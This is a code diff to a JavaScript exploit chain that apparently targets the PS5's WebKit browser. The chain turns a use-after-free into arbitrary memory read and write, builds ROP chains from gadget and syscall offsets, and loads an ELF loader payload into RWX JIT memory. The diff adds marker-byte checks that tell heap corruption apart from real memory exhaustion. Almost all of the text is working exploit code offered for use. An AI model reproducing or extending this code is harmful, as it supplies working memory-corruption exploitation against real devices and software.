@@ -828,6 +828,11 @@ async function runWebKitUAF(onProgress) {
                 installWindowP(carrier, { promote: true, onEvent: (tag, detail) => {
                     log(`MEM: ${tag}: ${detail}`, "log-info");
                 } });
+                // Keep the carrier: its assertHome() is the only way to tell
+                // genuine memory exhaustion from a corrupted heap, because a
+                // broken JSC heap also reports "not enough system memory space"
+                // for every later allocation. Checked after each ROP run below.
+                exploitState.carrier = carrier;
                 exploitState.p = window.p;
                 log("WebKit arbitrary R/W established!", "log-ok");
                 log(`Primitive established on attempt ${carrier.attempts}/${EXPLOIT_ATTEMPTS}.`, "log-ok");
@@ -1055,6 +1060,26 @@ async function initROP() {
 
     surveyThreads(p, libKernelBase, offsets);
 
+    // "Not enough system memory space" is ambiguous on the PS5: a genuinely
+    // full heap and a CORRUPTED heap both report it, and a corrupted one only
+    // starts failing after whatever wrote into it. The carrier writes three
+    // known marker bytes (0x3c in the window, 0x3c in its mirror, 0xa5 in the
+    // target view), so assertHome() tells us which one we are looking at.
+    //   true  -> the heap is fine, the failure is real exhaustion
+    //   false -> a ROP chain wrote somewhere wrong and wrecked the heap
+    const carrier = exploitState.carrier;
+    function health(tag) {
+        let ok;
+        try {
+            ok = (carrier && typeof carrier.assertHome === "function")
+                ? carrier.assertHome() : null;
+        } catch (err) { ok = "threw:" + err.message; }
+        const good = ok === true;
+        log(`health[${tag}]: assertHome=${ok}`, good ? "log-ok" : "log-err");
+        return good;
+    }
+    health("after-primitive");
+
     let gadgets = {};
     for (let g in offsets.wk_gadgetmap) gadgets[g] = libSceNKWebKitBase.add32(offsets.wk_gadgetmap[g]);
     let syscalls = {};
@@ -1234,13 +1259,21 @@ async function initROP() {
         }
         await new Promise(r => { ropWorker.onmessage = r; ropWorker.postMessage(0); });
         log("ROP: chain finished, worker replied (longjmp restore OK)", "log-info");
+        // The chain just ran on a hijacked thread. If it wrote anywhere wrong
+        // the JSC heap is now corrupt and the NEXT allocation reports
+        // "not enough system memory space" -- so check the markers now.
+        if (!health("post-chain")) {
+            log("ROP: heap markers are wrong -- the chain corrupted the WebProcess. "
+                + "Any 'not enough system memory' from here on is a symptom, not a cause.",
+                "log-err");
+        }
     }});
 
     exploitState.chain = chain;
-    return { p, chain, gadgets, syscalls, malloc, array_from_address, nogc, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase, libcMemcpy: libSceLibcInternalBase.add32(offsets.lc_memcpy) };
+    return { p, chain, gadgets, syscalls, malloc, array_from_address, nogc, health, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase, libcMemcpy: libSceLibcInternalBase.add32(offsets.lc_memcpy) };
 }
 
-async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy }) {
+async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy, health }) {
     log("Loading elfldr-ps5-1360.elf via ROP...", "log-info");
     const res = await fetch("payloads/elfldr-ps5-1360.elf", { cache: "no-store" });
     if (!res.ok) throw new Error(`Failed to fetch elfldr: HTTP ${res.status}`);
@@ -1315,6 +1348,9 @@ async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy }) {
     // then went on to write 397 KB of ELF at 0xffffffffffffffff, which is what
     // ended in "not enough memory space".
     log(`entering first ROP syscall: jitshm_create(0, 0x${imageSize.toString(16)}, PROT_RWX)`, "log-info");
+    if (typeof health === "function" && !health("before-jitshm")) {
+        throw new Error("heap was already corrupt before the first syscall");
+    }
     const jitFd = await chain.syscall_int32(SYS_JITSHM_CREATE, 0, imageSize, PROT_RWX);
     if (!(jitFd >= 0)) throw new Error(`jitshm_create(0x215) failed: fd=${jitFd}`);
     log(`jitshm_create -> fd ${jitFd} (0x${imageSize.toString(16)} bytes, PROT_RWX)`, "log-ok");
